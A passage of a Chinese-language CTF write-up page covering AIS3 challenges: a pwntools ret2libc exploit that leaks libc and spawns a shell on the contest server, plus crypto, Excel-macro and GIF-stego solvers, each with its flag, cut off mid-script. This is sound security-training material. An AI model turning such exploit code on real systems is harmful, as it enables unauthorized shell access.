+  <li>整理一下可以發現當 <code class="language-plaintext highlighter-rouge">read</code> 2 次、 <code class="language-plaintext highlighter-rouge">write</code> 3 次時可以 read 0x100 bytes，而當 <code class="language-plaintext highlighter-rouge">read</code> 3 次、 <code class="language-plaintext highlighter-rouge">write</code> 8 次時可以寫 0x1000 bytes。各個 memory 紀錄的數值如下：
+    <ul>
+      <li><code class="language-plaintext highlighter-rouge">[0x404f00]</code> counts how many time read been called</li>
+      <li><code class="language-plaintext highlighter-rouge">[0x404f08]</code> counts how many time write been called</li>
+      <li><code class="language-plaintext highlighter-rouge">[0x404f10]</code> original read</li>
+      <li><code class="language-plaintext highlighter-rouge">[0x404f18]</code> original write</li>
+    </ul>
+  </li>
+  <li>
+    <p>因此我們可以用 <code class="language-plaintext highlighter-rouge">read</code> 0x100 bytes 來 leak glibc (libc version 可從提供的 container 得知)，然後用 <code class="language-plaintext highlighter-rouge">write</code> 0x1000 bytes 做 ret2libc。</p>
+
+    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+</pre></td><td class="rouge-code"><pre><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+   
+<span class="c1">#p = remote('127.0.0.1', 12348)
+</span><span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'chals1.ais3.org'</span><span class="p">,</span> <span class="mi">12348</span><span class="p">)</span>
+<span class="n">debug</span> <span class="o">=</span> <span class="bp">False</span>
+   
+<span class="c1">#p = process('./magic/share/magic')
+#p = gdb.debug('./magic/share/magic', gdbscript='continue')
+#debug = True
+</span>   
+<span class="k">def</span> <span class="nf">read</span><span class="p">():</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">'[*] Reading'</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">'&gt; '</span><span class="p">))</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">'w'</span><span class="p">)</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">'read'</span><span class="p">)[:</span><span class="o">-</span><span class="mi">4</span><span class="p">]</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">'[*] Read'</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">data</span>
+   
+<span class="k">def</span> <span class="nf">write</span><span class="p">(</span><span class="n">data</span><span class="o">=</span><span class="sa">b</span><span class="s">'A'</span><span class="p">):</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">'[*] Writing'</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">'&gt; '</span><span class="p">))</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">'r'</span><span class="p">)</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">'[*] Written'</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
+    <span class="k">return</span>
+   
+<span class="k">def</span> <span class="nf">super_read</span><span class="p">():</span>
+    <span class="n">write</span><span class="p">()</span>
+    <span class="n">write</span><span class="p">()</span>
+    <span class="n">read</span><span class="p">()</span>
+    <span class="n">read</span><span class="p">()</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="n">read</span><span class="p">()</span>
+    <span class="k">return</span> <span class="n">data</span>
+   
+<span class="k">def</span> <span class="nf">super_write</span><span class="p">(</span><span class="n">payload</span><span class="p">):</span>
+    <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">5</span><span class="p">):</span>
+        <span class="n">read</span><span class="p">()</span>
+    <span class="n">write</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+   
+<span class="c1"># leak libc: version libc6_2.31-0ubuntu9.2_amd64
+</span><span class="n">leak</span> <span class="o">=</span> <span class="n">super_read</span><span class="p">()</span>
+<span class="k">print</span><span class="p">(</span><span class="s">'leak:'</span><span class="p">,</span> <span class="n">leak</span><span class="p">)</span>
+   
+<span class="k">if</span> <span class="n">debug</span><span class="p">:</span>
+    <span class="n">libc</span> <span class="o">=</span> <span class="nb">int</span><span class="p">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">leak</span><span class="p">[</span><span class="mi">22</span><span class="p">:</span><span class="mi">22</span><span class="o">+</span><span class="mi">8</span><span class="p">],</span> <span class="s">'little'</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x240b3</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="n">libc</span> <span class="o">=</span> <span class="nb">int</span><span class="p">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">leak</span><span class="p">[</span><span class="mi">27</span><span class="p">:</span><span class="mi">27</span><span class="o">+</span><span class="mi">8</span><span class="p">],</span> <span class="s">'little'</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x240b3</span>
+<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'[+] Libc base: </span><span class="si">{</span><span class="n">libc</span><span class="p">:</span><span class="c1">#2x</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
+<span class="n">padding</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'A'</span><span class="o">*</span><span class="mi">22</span>
+<span class="n">system</span> <span class="o">=</span> <span class="n">libc</span> <span class="o">+</span> <span class="mh">0x522c0</span>
+<span class="n">bin_sh</span> <span class="o">=</span> <span class="n">libc</span> <span class="o">+</span> <span class="mh">0x1b45bd</span>
+<span class="n">pop_rdi</span> <span class="o">=</span> <span class="mh">0x401313</span>
+<span class="n">ret</span> <span class="o">=</span> <span class="mh">0x40101a</span>
+   
+<span class="n">payload</span> <span class="o">=</span> <span class="n">padding</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">bin_sh</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">system</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">super_write</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">'c'</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+   
+</pre></td></tr></tbody></table></code></pre></div>    </div>
+  </li>
+</ol>
+
+<p><strong>Flag:</strong> <code class="language-plaintext highlighter-rouge">AIS3{ma4a4a4aGiCian}</code></p>
+
+<h3 id="utf-8-editor--crash">UTF-8 Editor — Crash</h3>
+
+<ol>
+  <li>輸入 <code class="language-plaintext highlighter-rouge">你ㄏ</code>，讓 <code class="language-plaintext highlighter-rouge">ㄏ</code> 注音組字的階段，然後刪掉 <code class="language-plaintext highlighter-rouge">你ㄏ</code>，會留下一個類似空白的東西，輸入進去，然後 print 就解了。</li>
+  <li>猜測應該是我的環境有一些編碼問題之類的，肯定不是 intended XD</li>
+</ol>
+
+<p><strong>Flag:</strong> <code class="language-plaintext highlighter-rouge">AIS3{unsigned_intergers_are_so_cool}</code></p>
+
+<h2 id="crypto">Crypto</h2>
+
+<h3 id="sc">SC</h3>
+
+<ol>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">cipher.py</code> 建立隨機的 substitution cipher，然後給我們替換過後的 <code class="language-plaintext highlighter-rouge">cipher.py.enc</code> 和 <code class="language-plaintext highlighter-rouge">flag.txt.enc</code>。因為 <code class="language-plaintext highlighter-rouge">cipher.py.enc</code> 有足夠多字元，因此我可以用它重建 substitution 的 mapping，然後把 <code class="language-plaintext highlighter-rouge">flag.txt.enc</code> decrypt 回來。</p>
+
+    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+</pre></td><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">string</span>
+   
+<span class="n">charset</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">string</span><span class="p">.</span><span class="n">ascii_lowercase</span> <span class="o">+</span> <span class="n">string</span><span class="p">.</span><span class="n">ascii_uppercase</span> <span class="o">+</span> <span class="n">string</span><span class="p">.</span><span class="n">digits</span><span class="p">)</span>
+<span class="n">enc_charset</span> <span class="o">=</span> <span class="p">[</span><span class="bp">None</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">charset</span><span class="p">))]</span>
+   
+<span class="k">print</span><span class="p">(</span><span class="n">charset</span><span class="p">)</span>
+   
+<span class="n">txt</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">'./cipher.py'</span><span class="p">,</span> <span class="s">'r'</span><span class="p">).</span><span class="n">read</span><span class="p">()</span>
+<span class="n">enc</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">'./cipher.py.enc'</span><span class="p">,</span> <span class="s">'r'</span><span class="p">).</span><span class="n">read</span><span class="p">()</span>
+   
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">txt</span><span class="p">)):</span>
+    <span class="n">c</span> <span class="o">=</span> <span class="n">txt</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
+    <span class="n">enc_c</span> <span class="o">=</span> <span class="n">enc</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
+    <span class="k">if</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">charset</span><span class="p">:</span>
+        <span class="n">idx</span> <span class="o">=</span> <span class="n">charset</span><span class="p">.</span><span class="n">index</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>
+        <span class="n">enc_charset</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span> <span class="o">=</span> <span class="n">enc_c</span>
+   
+   
+<span class="n">charset</span> <span class="o">=</span> <span class="s">''</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">charset</span><span class="p">)</span>
+<span class="n">enc_charset</span> <span class="o">=</span> <span class="s">''</span><span class="p">.</span><span class="n">join</span><span class="p">([</span><span class="n">x</span> <span class="k">if</span> <span class="n">x</span> <span class="ow">is</span> <span class="ow">not</span> <span class="bp">None</span> <span class="k">else</span> <span class="s">'@'</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">enc_charset</span><span class="p">])</span>
+   
+<span class="n">T</span> <span class="o">=</span> <span class="nb">str</span><span class="p">.</span><span class="n">maketrans</span><span class="p">(</span><span class="n">enc_charset</span><span class="p">,</span> <span class="n">charset</span><span class="p">)</span>
+   
+<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">'./flag.txt.enc'</span><span class="p">,</span> <span class="s">'r'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+    <span class="n">enc_flag</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="n">read</span><span class="p">()</span>
+<span class="k">print</span><span class="p">(</span><span class="n">enc_flag</span><span class="p">.</span><span class="n">translate</span><span class="p">(</span><span class="n">T</span><span class="p">))</span>
+</pre></td></tr></tbody></table></code></pre></div>    </div>
+  </li>
+</ol>
+
+<p><strong>Flag:</strong> <code class="language-plaintext highlighter-rouge">AIS3{s0lving_sub5t1tuti0n_ciph3r_wi7h_kn0wn_p14int3xt_4ttack}</code></p>
+
+<h3 id="fast-cipher">Fast Cipher</h3>
+
+<ol>
+  <li>
+    <p>因為會和 <code class="language-plaintext highlighter-rouge">0xff</code> 取 bitwise and，因此只要找到和初始的 <code class="language-plaintext highlighter-rouge">key</code> 最後一個 byte 相同的數即可。(應該是這樣吧，我也沒有非常確定我的思路是不是對的…)。</p>
+
+    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+</pre></td><td class="rouge-code"><pre><span class="kn">from</span> <span class="nn">secrets</span> <span class="kn">import</span> <span class="n">randbelow</span>
+   
+<span class="n">M</span> <span class="o">=</span> <span class="mi">2</span><span class="o">**</span><span class="mi">1024</span>
+   
+<span class="k">def</span> <span class="nf">f</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
+    <span class="c1"># this is a *fast* function
+</span>    <span class="k">return</span> <span class="p">(</span>
+        <span class="mi">4</span> <span class="o">*</span> <span class="n">x</span><span class="o">**</span><span class="mi">4</span> <span class="o">+</span> <span class="mi">8</span> <span class="o">*</span> <span class="n">x</span><span class="o">**</span><span class="mi">8</span> <span class="o">+</span> <span class="mi">7</span> <span class="o">*</span> <span class="n">x</span><span class="o">**</span><span class="mi">7</span> <span class="o">+</span> <span class="mi">6</span> <span class="o">*</span> <span class="n">x</span><span class="o">**</span><span class="mi">6</span> <span class="o">+</span> <span class="mi">3</span> <span class="o">*</span> <span class="n">x</span><span class="o">**</span><span class="mi">3</span> <span class="o">+</span> <span class="mh">0x48763</span>
+    <span class="p">)</span> <span class="o">%</span> <span class="n">M</span>
+   
+<span class="k">def</span> <span class="nf">encrypt</span><span class="p">(</span><span class="n">pt</span><span class="p">,</span> <span class="n">key</span><span class="p">):</span>
+    <span class="n">ct</span> <span class="o">=</span> <span class="p">[]</span>
+    <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">pt</span><span class="p">:</span>
+        <span class="n">ct</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">c</span> <span class="o">^</span> <span class="p">(</span><span class="n">key</span> <span class="o">&amp;</span> <span class="mh">0xFF</span><span class="p">))</span>
+        <span class="n">key</span> <span class="o">=</span> <span class="n">f</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
+    <span class="k">return</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">ct</span><span class="p">)</span>
+   
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
+    <span class="n">key</span> <span class="o">=</span> <span class="n">randbelow</span><span class="p">(</span><span class="n">M</span><span class="p">)</span>
+    <span class="n">ct</span> <span class="o">=</span> <span class="n">encrypt</span><span class="p">(</span><span class="nb">open</span><span class="p">(</span><span class="s">"flag.txt"</span><span class="p">,</span> <span class="s">"rb"</span><span class="p">).</span><span class="n">read</span><span class="p">().</span><span class="n">strip</span><span class="p">(),</span> <span class="n">key</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="n">ct</span><span class="p">.</span><span class="nb">hex</span><span class="p">())</span>
+</pre></td></tr></tbody></table></code></pre></div>    </div>
+  </li>
+  <li>
+    <p>寫個 script 爆搜一下，馬上就能算出 flag。</p>
+
+    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+</pre></td><td class="rouge-code"><pre><span class="n">M</span> <span class="o">=</span> <span class="mi">2</span><span class="o">**</span><span class="mi">1024</span>
+   
+<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">'./output.txt'</span><span class="p">,</span> <span class="s">'r'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+    <span class="n">enc_flag</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="n">read</span><span class="p">().</span><span class="n">strip</span><span class="p">()</span>
+<span class="n">enc_flag</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">enc_flag</span><span class="p">,</span> <span class="mi">16</span><span class="p">).</span><span class="n">to_bytes</span><span class="p">(</span><span class="mi">64</span><span class="p">,</span> <span class="s">'big'</span><span class="p">).</span><span class="n">strip</span><span class="p">(</span><span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">)</span>
+   
+<span class="k">def</span> <span class="nf">f</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
+    <span class="c1"># this is a *fast* function
+</span>    <span class="k">return</span> <span class="p">(</span>
+        <span class="mi">4</span> <span class="o">*</span> <span class="n">x</span><span class="o">**</span><span class="mi">4</span> <span class="o">+</span> <span class="mi">8</span> <span class="o">*</span> <span class="n">x</span><span class="o">**</span><span class="mi">8</span> <span class="o">+</span> <span class="mi">7</span> <span class="o">*</span> <span class="n">x</span><span class="o">**</span><span class="mi">7</span> <span class="o">+</span> <span class="mi">6</span> <span class="o">*</span> <span class="n">x</span><span class="o">**</span><span class="mi">6</span> <span class="o">+</span> <span class="mi">3</span> <span class="o">*</span> <span class="n">x</span><span class="o">**</span><span class="mi">3</span> <span class="o">+</span> <span class="mh">0x48763</span>
+    <span class="p">)</span> <span class="o">%</span> <span class="n">M</span>
+   
+<span class="k">def</span> <span class="nf">decrypt</span><span class="p">(</span><span class="n">key</span><span class="p">):</span>
+    <span class="n">flag</span> <span class="o">=</span> <span class="s">''</span>
+    <span class="k">for</span> <span class="n">e</span> <span class="ow">in</span> <span class="n">enc_flag</span><span class="p">:</span>
+        <span class="n">flag</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">e</span> <span class="o">^</span> <span class="p">(</span><span class="n">key</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">))</span>
+        <span class="n">key</span> <span class="o">=</span> <span class="n">f</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
+    <span class="k">if</span> <span class="s">'AIS3'</span> <span class="ow">in</span> <span class="n">flag</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
+        <span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+   
+<span class="k">for</span> <span class="n">k</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">2</span><span class="o">**</span><span class="mi">1024</span><span class="p">):</span>
+    <span class="n">tmp</span> <span class="o">=</span> <span class="s">''</span>
+    <span class="n">tmp_k</span> <span class="o">=</span> <span class="n">k</span>
+    <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">enc_flag</span><span class="p">[:</span><span class="mi">4</span><span class="p">]:</span>
+        <span class="n">tmp</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">c</span> <span class="o">^</span> <span class="p">(</span><span class="n">tmp_k</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">))</span>
+        <span class="n">tmp_k</span> <span class="o">=</span> <span class="n">f</span><span class="p">(</span><span class="n">tmp_k</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">tmp</span> <span class="o">==</span> <span class="s">'AIS3'</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">'repeat!'</span><span class="p">,</span> <span class="n">k</span><span class="p">)</span>
+        <span class="n">decrypt</span><span class="p">(</span><span class="n">k</span><span class="p">)</span>
+        <span class="k">break</span>
+</pre></td></tr></tbody></table></code></pre></div>    </div>
+  </li>
+</ol>
+
+<p><strong>Flag:</strong> <code class="language-plaintext highlighter-rouge">AIS3{not_every_bits_are_used_lol}</code></p>
+
+<h2 id="misc">Misc</h2>
+
+<h3 id="excel">Excel</h3>
+
+<ol>
+  <li><code class="language-plaintext highlighter-rouge">xlsm</code> 是包含 macro 的 xls 檔，可以用 <code class="language-plaintext highlighter-rouge">unzip</code> 解開，然後在 <code class="language-plaintext highlighter-rouge">xl/macrosheets/</code> 找到 macro sheet <code class="language-plaintext highlighter-rouge">sheet1.xml</code>。</li>
+  <li>
+    <p>跟 Execl 和 macro 實在不熟，最後直接寫個 script hardcode to win…。</p>
+
+    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+</pre></td><td class="rouge-code"><pre><span class="c1"># from chal/xl/macrosheets/sheet1.xml
+</span><span class="n">a</span> <span class="o">=</span> <span class="s">'''
+FORMULA(mqLen!D14&amp;amp;Mment!BA10&amp;amp;coCGA!S17&amp;amp;coCGA!Q19&amp;amp;KRnsl!L19&amp;amp;Mment!F3&amp;amp;coCGA!G26&amp;amp;coCGA!O23&amp;amp;coCGA!P3&amp;amp;coCGA!K12&amp;amp;KRnsl!J19&amp;amp;KRnsl!C11&amp;amp;coCGA!N3&amp;amp;mqLen!E4&amp;amp;coCGA!D11&amp;amp;KRnsl!T5&amp;amp;JVHco!K10&amp;amp;mqLen!BA14&amp;amp;Mment!W1&amp;amp;KRnsl!U13&amp;amp;KRnsl!V9&amp;amp;mqLen!C12&amp;amp;KRnsl!J4&amp;amp;Mment!Y19&amp;amp;mqLen!K19&amp;amp;JVHco!F2&amp;amp;mqLen!K10&amp;amp;coCGA!Z15&amp;amp;mqLen!N21&amp;amp;Mment!N1&amp;amp;Mment!S2&amp;amp;coCGA!X2&amp;amp;Mment!D16&amp;amp;coCGA!U26&amp;amp;coCGA!R1&amp;amp;mqLen!V9&amp;amp;mqLen!R11&amp;amp;Mment!X1&amp;amp;coCGA!D5&amp;amp;KRnsl!Z19&amp;amp;mqLen!BA4&amp;amp;coCGA!Z9&amp;amp;coCGA!G7&amp;amp;mqLen!U10&amp;amp;Mment!U11&amp;amp;coCGA!G18&amp;amp;JVHco!V1&amp;amp;mqLen!O26&amp;amp;Mment!G5&amp;amp;KRnsl!H22&amp;amp;Mment!P10&amp;amp;JVHco!W17&amp;amp;Mment!F8&amp;amp;coCGA!L15&amp;amp;coCGA!H3&amp;amp;KRnsl!U17&amp;amp;KRnsl!BA11&amp;amp;coCGA!X12&amp;amp;KRnsl!F14&amp;amp;Mment!B10&amp;amp;KRnsl!V12&amp;amp;Mment!U12&amp;amp;coCGA!P14&amp;amp;coCGA!Y1&amp;amp;JVHco!B10&amp;amp;JVHco!F16&amp;amp;KRnsl!Q26&amp;amp;Mment!P25&amp;amp;KRnsl!M3&amp;amp;KRnsl!I26&amp;amp;mqLen!L15&amp;amp;mqLen!V25&amp;amp;KRnsl!G2&amp;amp;Mment!I18&amp;amp;Mment!M4&amp;amp;KRnsl!C7&amp;amp;JVHco!N5&amp;amp;KRnsl!M19&amp;amp;Mment!J9&amp;amp;Mment!I7&amp;amp;coCGA!G13&amp;amp;KRnsl!M12&amp;amp;mqLen!X2&amp;amp;mqLen!M1&amp;amp;JVHco!P3&amp;amp;KRnsl!S12&amp;amp;Mment!U10&amp;amp;JVHco!D16&amp;amp;mqLen!P17&amp;amp;KRnsl!I5&amp;amp;coCGA!W24&amp;amp;JVHco!E10&amp;amp;Mment!B8&amp;amp;coCGA!C14&amp;amp;JVHco!Z15&amp;amp;Mment!BA11&amp;amp;coCGA!F19&amp;amp;KRnsl!Z2&amp;amp;JVHco!D13&amp;amp;Mment!O2&amp;amp;KRnsl!D19&amp;amp;Mment!K19&amp;amp;Mment!U20&amp;amp;JVHco!Q9&amp;amp;KRnsl!I17&amp;amp;coCGA!X17&amp;amp;JVHco!Q24&amp;amp;KRnsl!Q4&amp;amp;coCGA!N21&amp;amp;coCGA!W11&amp;amp;JVHco!E17&amp;amp;mqLen!H19&amp;amp;KRnsl!X6&amp;amp;coCGA!N26&amp;amp;coCGA!N18&amp;amp;KRnsl!Q17&amp;amp;JVHco!J25&amp;amp;KRnsl!Z16&amp;amp;mqLen!P13&amp;amp;coCGA!Z21&amp;amp;JVHco!C24&amp;amp;Mment!X19&amp;amp;Mment!O21,A137)
+'''</span><span class="p">.</span><span class="n">strip</span><span class="p">()</span>
+<span class="n">a</span> <span class="o">=</span> <span class="n">a</span><span class="p">[</span><span class="mi">8</span><span class="p">:</span><span class="o">-</span><span class="mi">6</span><span class="p">]</span>
+<span class="n">a</span> <span class="o">=</span> <span class="n">a</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="s">'&amp;amp;'</span><span class="p">,</span> <span class="s">'&amp;'</span><span class="p">)</span>
+<span class="n">a</span> <span class="o">=</span> <span class="n">a</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">'&amp;'</span><span class="p">)</span>
+   
+<span class="c1"># hardcore...
+</span><span class="n">flag</span> <span class="o">=</span> <span class="s">''</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">a</span><span class="p">:</span>
+    <span class="n">c</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="sa">f</span><span class="s">'</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s"> &gt;'</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">c</span><span class="p">.</span><span class="n">isnumeric</span><span class="p">():</span>
+        <span class="n">c</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">c</span><span class="p">))</span>
+    <span class="n">flag</span> <span class="o">+=</span> <span class="n">c</span>
+<span class="k">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
+</pre></td></tr></tbody></table></code></pre></div>    </div>
+  </li>
+</ol>
+
+<p><strong>Flag:</strong> <code class="language-plaintext highlighter-rouge">AIS3{XLM_iS_to0_o1d_but_co0o0o00olll!!}</code></p>
+
+<h3 id="gift-in-the-dream">Gift in the dream</h3>
+
+<ol>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">strings</code> GIF 檔可以看到一些 hint，因此猜測 flag 跟 GIF 中每個 frame 的 duration 有關。寫個 script print 出來看看。</p>
+
+    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+</pre></td><td class="rouge-code"><pre><span class="kn">from</span> <span class="nn">PIL</span> <span class="kn">import</span> <span class="n">Image</span>
+   
+<span class="c1"># ref: https://stackoverflow.com/questions/53364769/get-frames-per-second-of-a-gif-in-python
+</span>   
+<span class="n">im</span> <span class="o">=</span> <span class="n">Image</span><span class="p">.</span><span class="nb">open</span><span class="p">(</span><span class="s">'./gift_in_the_dream_updated.gif'</span><span class="p">)</span>
+<span class="k">try</span><span class="p">:</span>
+    <span class="k">while</span> <span class="mi">1</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="n">im</span><span class="p">.</span><span class="n">info</span><span class="p">[</span><span class="s">'duration'</span><span class="p">])</span>
+        <span class="n">im</span><span class="p">.</span><span class="n">seek</span><span class="p">(</span><span class="n">im</span><span class="p">.</span><span class="n">tell</span><span class="p">()</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span>
+<span class="k">except</span> <span class="nb">EOFError</span><span class="p">:</span>
+    <span class="k">pass</span>
+</pre></td></tr></tbody></table></code></pre></div>    </div>
+  </li>
+</ol>
+
+<p><img width="800" alt="gift-in-the-dream-durations" src="https://user-images.githubusercontent.com/38059464/176882746-edc345bd-2ce1-4cbb-a0c3-4c33955ebbbd.png" /></p>
+
+<ol>
+  <li>
+    <p>可以發現 <code class="language-plaintext highlighter-rouge">duration / 10</code> 皆在 ASCII 範圍內，因此把 <code class="language-plaintext highlighter-rouge">duration / 10</code> 組合起來即為 flag。</p>
+
+    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+</pre></td><td class="rouge-code"><pre><span class="kn">from</span> <span class="nn">PIL</span> <span class="kn">import</span> <span class="n">Image</span>
+   
+<span class="c1"># ref: https://stackoverflow.com/questions/53364769/get-frames-per-second-of-a-gif-in-python
+</span>   
+<span class="n">im</span> <span class="o">=</span> <span class="n">Image</span><span class="p">.</span><span class="nb">open</span><span class="p">(</span><span class="s">'./gift_in_the_dream_updated.gif'</span><span class="p">)</span>
+   
+<span class="n">flag</span> <span class="o">=</span> <span class="s">''</span>
+<span class="k">try</span><span class="p">:</span>
+    <span class="k">while</span> <span class="mi">1</span><span class="p">:</span>
